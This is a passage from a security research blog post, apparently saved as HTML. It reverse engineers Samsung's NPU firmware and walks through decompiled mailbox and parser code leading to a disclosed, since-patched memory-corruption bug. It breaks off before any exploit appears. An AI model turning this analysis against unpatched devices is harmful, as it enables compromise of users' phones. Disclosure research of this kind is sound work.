<!DOCTYPE html>
<html lang="en"><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
    <!-- Encoding -->
    <meta charset="utf-8">

    <!-- Title -->
    <title>Reversing and Exploiting Samsung's NPU (Part&nbsp;2) - Impalabs Blog</title>
    <meta name="description" content="After an in-depth analysis of the NPU OS and its interaction with the Android kernel, this second part gives a more offensive outlook on this component. We will go through the main attack vectors to target it and detail two vulnerabilities that can be chained together to get code execution in the NPU from the NPU driver before pivotting back into the kernel.">

    <!-- Favicons -->
    <link rel="icon" href="https://blog.impalabs.com/img/favicons/favicon.svg" type="image/svg+xml">
    <link rel="icon" href="https://blog.impalabs.com/img/favicons/favicon.ico">
    <link rel="apple-touch-icon" href="https://blog.impalabs.com/img/favicons/favicon-180.png">
    <link rel="manifest" href="https://blog.impalabs.com/img/favicons/manifest.webmanifest">

    <!-- CSS -->
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/style.css">

    <!-- SEO -->
    <meta property="og:title" content="Reversing and Exploiting Samsung's NPU (Part&nbsp;2)">
    <meta property="og:description" content="After an in-depth analysis of the NPU OS and its interaction with the Android kernel, this second part gives a more offensive outlook on this component. We will go through the main attack vectors to target it and detail two vulnerabilities that can be chained together to get code execution in the NPU from the NPU driver before pivotting back into the kernel.">
    <meta property="og:image" content="https://blog.impalabs.com/img/social/og.png">

    <meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:site" content="@the_impalabs">
    <meta name="twitter:title" content="Reversing and Exploiting Samsung's NPU (Part&nbsp;2)">
    <meta name="twitter:description" content="After an in-depth analysis of the NPU OS and its interaction with the Android kernel, this second part gives a more offensive outlook on this component. We will go through the main attack vectors to target it and detail two vulnerabilities that can be chained together to get code execution in the NPU from the NPU driver before pivotting back into the kernel.">
    <meta name="twitter:image" content="https://blog.impalabs.com/img/social/twitter.png">
    <meta name="twitter:image:alt" content="impalabs blog logo twitter card">

    <!-- RSS Feed -->
    <link rel="alternate" type="application/rss+xml" title="Impalabs Blog" href="https://blog.impalabs.com/feed.xml">
</head>

<body>
    <!-- Header -->
    <header class="impalabs-header">
        <!-- Stars -->
        <div class="impalabs-header-stars"></div>

        <!-- Navbar -->
        <nav class="navbar" aria-label="main navigation">
            <div class="container">
                <!-- Navbar logo -->
                <div class="navbar-brand">
                    <a class="navbar-item" href="https://blog.impalabs.com/">
                        <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/impalabs_logo_name_light.svg" alt="impalabs light logo and name" width="362.656px" height="96px">
                    </a>
                </div>

                <!-- Navbar burger toggle -->
                <input type="checkbox" id="navbar-burger-toggle" class="navbar-burger-toggle is-hidden">
                <label for="navbar-burger-toggle" class="navbar-burger">
                    <span></span>
                    <span></span>
                    <span></span>
                </label>

                <!-- Navbar menu -->
                <div class="navbar-menu">
                    <div class="navbar-end has-text-centered">
                        <a href="https://blog.impalabs.com/" class="navbar-item">
                            <button class="button is-primary">
                                Articles
                            </button>
                        </a>
                        <a href="https://blog.impalabs.com/tags/" class="navbar-item">
                            <button class="button is-primary">
                                Tags
                            </button>
                        </a>
                        <a type="application/rss+xml" href="https://blog.impalabs.com/feed.xml" class="navbar-item">
                            <button class="button is-primary">
                                RSS
                            </button>
                        </a>
                        <a href="https://impalabs.com/" class="navbar-item">
                            <button class="button is-primary">
                                Website
                            </button>
                        </a>
                    </div>
                </div>
            </div>
        </nav>

        <!-- Impalabs space base -->
        <div class="section" id="impalabs-space-base">
            <div class="container is-centered">
                <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/space_base.svg" alt="impalabs space base graphics" width="1133px" height="360px">
            </div>
        </div>
    </header>

    <!-- Blog content section -->
    <section id="content" class="section">
        <div class="container container-out">
            <div class="container content container-in">


<span itemscope="" itemtype="http://schema.org/BlogPosting">

<!-- Title -->
<span class="blog-title" itemprop="name headline">Reversing and Exploiting Samsung's NPU (Part&nbsp;2)</span>

<!-- Metadata -->
<div class="columns is-centered is-multiline blog-metadata">
    <!-- Date -->
    <div class="column is-narrow blog-date">
        <span itemprop="datePublished"><time datetime="2021-10-25"><img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/calendar.svg" alt="Calendar icon" width="30px" height="30px"> Oct 25, 2021</time></span>
    </div>
    <!-- Authors -->
    <div class="column is-narrow blog-authors">
        <span><span itemprop="author" itemscope="" itemtype="http://schema.org/Person">
    <a href="https://blog.impalabs.com/authors/maxime-peterlin.html"><img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/users.svg" alt="Users icon" width="30px" height="30px"> <span itemprop="name">Maxime Peterlin</span></a>
</span></span>
    </div>
    <!-- Tags -->
    <meta itemprop="keywords" content="Android,Kernel,Samsung,NPU,Vulnerability Research,Exploitation">
    <div class="column is-narrow blog-tags">
        <a href="https://blog.impalabs.com/tags/android.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Android</a> <a href="https://blog.impalabs.com/tags/kernel.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Kernel</a> <a href="https://blog.impalabs.com/tags/samsung.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Samsung</a> <a href="https://blog.impalabs.com/tags/npu.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> NPU</a> <a href="https://blog.impalabs.com/tags/vulnerability-research.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Vulnerability Research</a> <a href="https://blog.impalabs.com/tags/exploitation.html">
    <img src="2021-%20%22Reversing%20and%20Exploiting%20Samsung's%20NPU%22%20by%20Maxime%20Peterlin%20part%202_files/tags.svg" alt="Tags icon" width="30px" height="30px"> Exploitation</a>
    </div>
</div>

<!-- Disclaimer -->
<article id="disclaimer" class="message is-info">
    <div class="message-header is-info">Disclaimer</div>
    <div class="message-body">
        <p>This work was done while we were working at <a href="https://longterm.io/">Longterm Security</a> and they have kindly allowed us to release the article on our company's blog.</p>
    </div>
</article>

<!-- Summary -->
<meta itemprop="description" content="After an in-depth analysis of the NPU OS and its interaction with the Android kernel, this second part gives a more offensive outlook on this component. We will go through the main attack vectors to target it and detail two vulnerabilities that can be chained together to get code execution in the NPU from the NPU driver before pivotting back into the kernel.">
<span class="blog-summary"><p>After an in-depth analysis of the NPU OS 
and its interaction with the Android kernel, this second part gives a 
more offensive outlook on this component. We will go through the main 
attack vectors to target it and detail two vulnerabilities that can be 
chained together to get code execution in the NPU from the NPU driver 
before pivotting back into the kernel.</p></span>

<!-- Separator -->
<span id="blog-separator"></span>

<!-- Table of contents -->
<article class="message">
    <div class="message-body">
        <div class="toc"><span class="toctitle">Table of Contents</span><ul>
<li><a href="#limited-arbitrary-write-in-the-neural-processing-unit">Limited Arbitrary Write in the Neural Processing Unit</a><ul>
<li><a href="#communication-between-the-npu-and-the-kernel">Communication Between the NPU and the Kernel</a></li>
<li><a href="#vulnerability-details">Vulnerability Details</a></li>
<li><a href="#exploitation">Exploitation</a></li>
</ul>
</li>
<li><a href="#buffer-overflow-in-samsung-npu-driver">Buffer Overflow in Samsung NPU Driver</a><ul>
<li><a href="#npu-mailboxes">NPU Mailboxes</a></li>
<li><a href="#vulnerability-details_1">Vulnerability Details</a></li>
<li><a href="#exploitation_1">Exploitation</a></li>
</ul>
</li>
<li><a href="#conclusion">Conclusion</a></li>
<li><a href="#timeline">Timeline</a></li>
</ul>
</div>

    </div>
</article>


<!-- Blogpost content start =============================================== -->
<span itemprop="articleBody">
<p>This article is the second part in a series about reversing and 
exploiting Samsung's Neural Processing Unit. NPUs are generally used to 
provide dedicated computing power for machine learning and AI-related 
algorithms. While it could make for an interesting article, if you've 
read the <a href="https://blog.impalabs.com/2103_reversing-samsung-npu.html">first part</a>, you know that our primary interest is rather the underlying custom OS Samsung has implemented for its NPU.</p>
<p>Part 1 focused on reverse engineering almost exhaustively what could 
be considered the kernel of the NPU OS, i.e. all the subsystems related 
to memory allocation, task scheduling, event handling, etc. While 
reading it is encouraged to understand this second part, it's not a 
prerequisite. We will try to provide the necessary context along the way
 so that you can still follow easily.</p>
<p>In this second part, we will detail two vulnerabilities that were 
identified while reverse engineering the NPU OS. We will also explain 
how an exploit can be constructed to trigger a buffer overflow in the 
Android kernel from a user able to access the NPU driver.</p>
<p>Regarding the disclosure process, these issues have been reported to Samsung and have been patched in their <a href="https://security.samsungmobile.com/securityUpdate.smsb">May and June security bulletins</a> under the identifiers <code>SVE-2021-20204</code> and <code>SVE-2021-21074</code>. The exploits used in this article are tailored for the Samsung Galaxy S20 <code>SM-G980F</code> running the unpatched firmware <a href="https://www.sammobile.com/samsung/galaxy-s20/firmware/SM-G980F/XEF/download/G980FXXS5CTL5/1117440/">G980FXXS5CTL5</a> from January 2021.</p>
<p>Now that we are done with the introduction, let's move on to the 
analysis of the first vulnerability identified: a limited write to an 
arbitrary address in the NPU's address space.</p>
<h1 id="limited-arbitrary-write-in-the-neural-processing-unit">Limited Arbitrary Write in the Neural Processing Unit<a class="headerlink" href="#limited-arbitrary-write-in-the-neural-processing-unit" title="Permanent link">¶</a></h1>
<h2 id="communication-between-the-npu-and-the-kernel">Communication Between the NPU and the Kernel<a class="headerlink" href="#communication-between-the-npu-and-the-kernel" title="Permanent link">¶</a></h2>
<p>As we have explained previously, the NPU is a dedicated chip running 
its own firmware independently from the Android kernel. In simplified 
terms, the NPU is a blackbox providing an API that can be queried from 
the kernel. Inputs are sent to it, ML algorithms do their magic, and the
 results are sent back.</p>
<p>In the first part of this series, in the section called <a href="https://blog.impalabs.com/2103_reversing-samsung-npu.html#interacting-with-the-npu"><em>Interacting with the NPU</em></a>,
 we explained how the NPU and the kernel communicate using a system of 
shared memory and mailboxes. In a nutshell, the kernel starts off by 
mapping the NPU's shared memory regions using <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/soc/9830/npu-system-soc.c#L603"><code>init_iomem_area</code></a>. It then creates a request for the NPU and writes into the mailbox by calling <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/npu-session.c#L1433"><code>npu_session_put_nw_req</code></a>.
 Once the message is ready to be sent, an interrupt is triggered and the
 NPU is notified that a new request is waiting in its low priority 
mailbox.</p>
<p>The <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/0x0a_mailbox.c#L263">task</a> responsible for the low priority mailbox parses the message using <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/0x0a_mailbox.c#L327"><code>mbx_dnward_get</code></a> and calls the corresponding command handler in <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/0x0a_mailbox.c#L438"><code>mbx_msghub_req</code></a>. The 9 command handlers implemented in the NPU are defined in <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/0x0a_mailbox.c#L79"><code>init_ncp_handlers</code></a>.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">void</span> <span class="nf">init_ncp_handlers</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ncp_handler_state_t</span> <span class="o">*</span><span class="n">ncp_handler_state</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">_unk_0x364</span> <span class="o">=</span> <span class="mi">4</span><span class="p">;</span>

    <span class="cm">/* Resets messages state */</span>
    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">NB_MESSAGES</span><span class="p">;</span> <span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">messages</span><span class="p">[</span><span class="n">i</span><span class="p">].</span><span class="n">state</span> <span class="o">=</span> <span class="n">RESPONSE_FREE</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Initializes the handlers for the request commands */</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_load</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_unload</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_process</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="o">=</span> <span class="n">profile_control</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_purge</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_powerdown</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="o">=</span> <span class="n">ut_main_func</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_policy</span><span class="p">;</span>
    <span class="n">ncp_handler_state</span><span class="o">-&gt;</span><span class="n">handlers</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="n">ncp_manager_end</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div>

<p>While pretty succint, this explanation should give you a rough understanding of where our data are coming from and how to map a <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/main/drivers/vision/npu/core/interface/hardware/mailbox_msg.h#L106">request type</a> in the kernel to a command handler in the NPU (e.g. <code>COMMAND_FW_TEST</code> and <code>ut_main_func</code>).</p>
<p>These handlers are the most obvious entry points into the NPU and 
targets of choice when it comes to vulnerability research. The next 
section presents a bug in one of those handlers, namely <code>ncp_manager_load</code>.</p>
<h2 id="vulnerability-details">Vulnerability Details<a class="headerlink" href="#vulnerability-details" title="Permanent link">¶</a></h2>
<p>To perform its tasks, the NPU relies on a system of objects called <code>ncp_object</code>
 which are filled with inputs sent by the kernel. They are identified by
 a number and are persistent across requests so that you can perform 
multiple operations on them if needed. Regarding the type of action that
 you can do, as the names of the command handlers suggests, it's 
possible to perform operations such as loading, unloading or processing 
an object. In our case, we will be looking at the loading process 
implemented in <code>ncp_manager_load</code>.</p>
<p>Information sent from the kernel are initially parsed as a <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/npu.h#L445"><code>struct message</code></a>, which specifies the command handler ID, the data to process and its length.</p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">message</span> <span class="p">{</span>
    <span class="n">u32</span> <span class="n">magic</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">mid</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">command</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">length</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">self</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">data</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p>The field <code>data</code> points to another structure, namely <a href="https://github.com/LongtermSecurityInc/samsung-npu/blob/main/reverse/npu.h#L466"><code>struct command</code></a>,
 and will be passed to the command handlers. The NPU will then be able 
to retrieve the payload to process as well as other information related 
to the request in the union <code>c</code> (e.g. object ID, task ID, etc.):</p>
<div class="codehilite"><pre><span></span><code><span class="k">struct</span> <span class="nc">command</span> <span class="p">{</span>
    <span class="k">union</span> <span class="p">{</span>
        <span class="k">struct</span> <span class="nc">cmd_load</span>     <span class="n">load</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_unload</span>   <span class="n">unload</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_process</span>  <span class="n">process</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_profile_ctl</span>  <span class="n">profile_ctl</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_fw_test</span>  <span class="n">fw_test</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_purge</span>    <span class="n">purge</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_powerdown</span>    <span class="n">powerdown</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_done</span>     <span class="n">done</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_ndone</span>    <span class="n">ndone</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">cmd_group_done</span>   <span class="n">gdone</span><span class="p">;</span>
    <span class="p">}</span> <span class="n">c</span><span class="p">;</span> <span class="cm">/* specific command properties */</span>

    <span class="n">u32</span> <span class="n">length</span><span class="p">;</span> <span class="cm">/* the size of payload */</span>
    <span class="n">u32</span> <span class="n">payload</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p>As can be seen in the code snippet below, after performing some sanity checks on the input values, <code>ncp_manager_load</code> calls an initialization handler from <code>g_ncp_object_state.callbacks</code>. If the object we're trying to use is free, the callback used will be <code>ncp_object_load</code> to which we pass the NCP object as well as the initial pointer on the <code>command</code> structure from the kernel.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">ncp_manager_load</span><span class="p">(</span><span class="k">struct</span> <span class="nc">command</span> <span class="o">**</span><span class="n">cmd_p</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
    <span class="k">struct</span> <span class="nc">ncp_object</span> <span class="o">*</span><span class="n">obj</span><span class="p">;</span>

    <span class="cm">/* Checks if the object ID is not out of bounds */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">.</span><span class="n">load</span><span class="p">.</span><span class="n">oid</span> <span class="o">&gt;=</span> <span class="mi">8</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x106</span><span class="p">;</span>
    <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="cm">/* Checks if the task ID is valid and not out of bounds */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">.</span><span class="n">load</span><span class="p">.</span><span class="n">tid</span> <span class="o">&gt;=</span> <span class="mi">2</span> <span class="o">&amp;&amp;</span> <span class="n">cmd</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">.</span><span class="n">load</span><span class="p">.</span><span class="n">tid</span> <span class="o">!=</span> <span class="mi">-1</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="mh">0x108</span><span class="p">;</span>
        <span class="k">return</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="n">obj</span> <span class="o">=</span> <span class="n">g_ncp_object_state</span><span class="p">.</span><span class="n">objects</span><span class="p">[</span><span class="n">cmd</span><span class="o">-&gt;</span><span class="n">c</span><span class="p">.</span><span class="n">load</span><span class="p">.</span><span class="n">oid</span><span class="p">]</span>

    <span class="cm">/* Irrelevant object setup */</span>

    <span class="cm">/* [...] */</span>

    <span class="cm">/*</span>
<span class="cm">     * Calls the corresponding initialisation callbacks</span>
<span class="cm">     * Depending on the current state of the object, one of those callbacks</span>
<span class="cm">     * could be something like ncp_object_load, ncp_object_process, or </span>
<span class="cm">     * ncp_object_invalid if we're trying to perform an invalid operation.</span>
<span class="cm">     * </span>
<span class="cm">     * In any case, when using an object for the first time, assuming</span>
<span class="cm">     * memory wasn't tampered with, the function called will be</span>
<span class="cm">     * ncp_object_load.</span>
<span class="cm">     */</span>
    <span class="p">(</span><span class="o">*</span><span class="n">g_ncp_object_state</span><span class="p">.</span><span class="n">callbacks</span><span class="p">[</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">state</span> <span class="o">*</span> <span class="mi">2</span><span class="p">])(</span><span class="n">obj</span><span class="p">,</span> <span class="n">cmd_p</span><span class="p">);</span>

    <span class="cm">/*</span>
<span class="cm">     * The rest of the function is not really relevant since it won't</span>
<span class="cm">     * interfere with our exploit once the vulnerable function in</span>
<span class="cm">     * ncp_object_load returns.</span>
<span class="cm">     */</span>

    <span class="cm">/* [...] */</span>
<span class="p">}</span>
</code></pre></div>

<p><code>ncp_object_load</code> checks that the payload and the length are not empty and, if that's the case, it calls <code>parser_init</code> with a pointer to a field in the <code>ncp_object</code>, the payload address and its length.</p>
<div class="codehilite"><pre><span></span><code>    <span class="kt">int</span> <span class="nf">ncp_object_load</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ncp_object</span> <span class="o">*</span><span class="n">obj</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">command</span> <span class="o">**</span><span class="n">cmd_p</span><span class="p">)</span> <span class="p">{</span>
        <span class="kt">int</span> <span class="n">ret</span><span class="p">;</span>
        <span class="k">struct</span> <span class="nc">command</span> <span class="o">*</span><span class="n">cmd</span> <span class="o">=</span> <span class="o">*</span><span class="n">cmd_p</span><span class="p">;</span>

        <span class="cm">/* Checks the payload pointer */</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">)</span> <span class="p">{</span>
            <span class="cm">/* Checks the payload length */</span>
            <span class="k">if</span> <span class="p">(</span><span class="n">cmd</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">)</span> <span class="p">{</span>
                <span class="cm">/* Parses the payload to fill the NCP object */</span>
                <span class="n">ret</span> <span class="o">=</span> <span class="n">parser_init</span><span class="p">(</span>
                    <span class="o">&amp;</span><span class="n">obj</span><span class="o">-&gt;</span><span class="n">ncp_object_copy_ptr</span><span class="p">,</span> <span class="n">cmd</span><span class="o">-&gt;</span><span class="n">payload</span><span class="p">,</span> <span class="n">cmd</span><span class="o">-&gt;</span><span class="n">length</span><span class="p">);</span>

                <span class="cm">/* [...] */</span>

        <span class="cm">/*</span>
<span class="cm">        * The rest of the function is not really relevant and won't</span>
<span class="cm">        * interfere with our exploit.</span>
<span class="cm">        */</span>

        <span class="cm">/* [...] */</span>
    <span class="p">}</span>
</code></pre></div>

<p>The role of <code>parser_init</code> is central to the loading process: it is responsible for parsing the kernel data stored in <code>cmd-&gt;payload</code> and copying them into the corresponding NCP object.</p>
<p><code>cmd-&gt;payload</code> is comprised of a header which references data placed after it. This header is a <a href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/ea563f4c3c9db1c07e673c49d2deb2e7fde1f7f7/drivers/vision/npu/core/include/ncp_header_v21.h#L300"><code>ncp_header</code></a> structure and is given below.</p>
<div class="codehilite"><pre><span></span><code><span class="cm">/* ncp_header structure used as header for the payload */</span>
<span class="k">struct</span> <span class="nc">ncp_header</span> <span class="p">{</span>
    <span class="n">u32</span> <span class="n">magic_number1</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">hdr_version</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">hdr_size</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">intrinsic_version</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">net_id</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">unique_id</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">priority</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">flags</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">period</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">workload</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">address_vector_offset</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">address_vector_cnt</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">memory_vector_offset</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">memory_vector_cnt</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">group_vector_offset</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">group_vector_cnt</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">body_version</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">body_offset</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">body_size</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">io_vector_offset</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">io_vector_cnt</span><span class="p">;</span>
    <span class="n">u32</span> <span class="n">reserved</span><span class="p">[</span><span class="mi">10</span><span class="p">];</span>
    <span class="n">u32</span> <span class="n">magic_number2</span><span class="p">;</span>
<span class="p">};</span>
</code></pre></div>

<p><code>parser_init</code> starts off by performing sanitity checks on 
the header fields to make sure the kernel did not send an invalid or 
incompatible payload.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">parser_init</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ncp_object</span> <span class="o">*</span><span class="n">ncp_object</span><span class="p">,</span> <span class="n">ncp_header</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* Checks the first magic number at the beginning of the structure */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">payload</span><span class="o">-&gt;</span><span class="n">magic_number1</span> <span class="o">!=</span> <span class="mh">0xC0FFEE0</span><span class="p">)</span>
    <span class="k">return</span> <span class="mh">0x10D</span><span class="p">;</span>

    <span class="cm">/* Checks the second magic number at the end of the structure */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">payload</span><span class="o">-&gt;</span><span class="n">magic_number2</span> <span class="o">!=</span> <span class="mh">0xC0DEC0DE</span><span class="p">)</span>
    <span class="k">return</span> <span class="mh">0x10E</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">     * Makes sure the header version used by the kernel is the same as</span>
<span class="cm">     * the NPU.</span>
<span class="cm">     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">payload</span><span class="o">-&gt;</span><span class="n">hdr_version</span> <span class="o">!=</span> <span class="mh">0x16</span><span class="p">)</span>
        <span class="k">return</span> <span class="mh">0x10F</span><span class="p">;</span>

    <span class="cm">/*</span>
<span class="cm">     * Makes sure the intrinsic API version used by the kernel is the same </span>
<span class="cm">     * as the NPU.</span>
<span class="cm">     */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">payload</span><span class="o">-&gt;</span><span class="n">intrinsic_version</span> <span class="o">&lt;</span> <span class="mh">0x15</span><span class="p">)</span>
        <span class="k">return</span> <span class="mh">0x10F</span><span class="p">;</span>

    <span class="cm">/* Makes sure the payload does not extend outside the heap */</span>
    <span class="n">u32</span> <span class="n">header_size</span> <span class="o">=</span> <span class="n">length</span> <span class="o">-</span> <span class="mh">0x7C</span> <span class="o">*</span> <span class="n">payload</span><span class="o">-&gt;</span><span class="n">io_vector_cnt</span><span class="p">;</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">header_size</span> <span class="o">&gt;=</span> <span class="mh">0x60000</span><span class="p">)</span>
        <span class="k">return</span> <span class="mh">0x10B</span><span class="p">;</span>

    <span class="cm">/* [...] */</span>
</code></pre></div>

<p>It then allocates memory for the new NCP object and starts copying data into it.</p>
<div class="codehilite"><pre><span></span><code><span class="kt">int</span> <span class="nf">parser_init</span><span class="p">(</span><span class="k">struct</span> <span class="nc">ncp_object</span> <span class="o">*</span><span class="n">ncp_object</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">ncp_header</span> <span class="o">*</span><span class="n">payload</span><span class="p">,</span> <span class="kt">int</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
    <span class="cm">/* </span>
<span class="cm">     * Allocates memory to get a copy of the header from the kernel into</span>
<span class="cm">     * the NPU</span>
<span class="cm">     */</span>
    <span class="k">struct</span> <span class="nc">ncp_header</span><span class="o">*</span> <span class="n">ncp_header</span> <span class="o">=</span> <span class="p">(</span><span class="n">ncp_header</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="n">header_size</span><span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">ncp_header</span> <span class="p">)</span>
        <span class="k">return</span> <span class="mh">0x10C</span><span class="p">;</span>

    <span class="cm">/* Copies the header from the payload */</span>
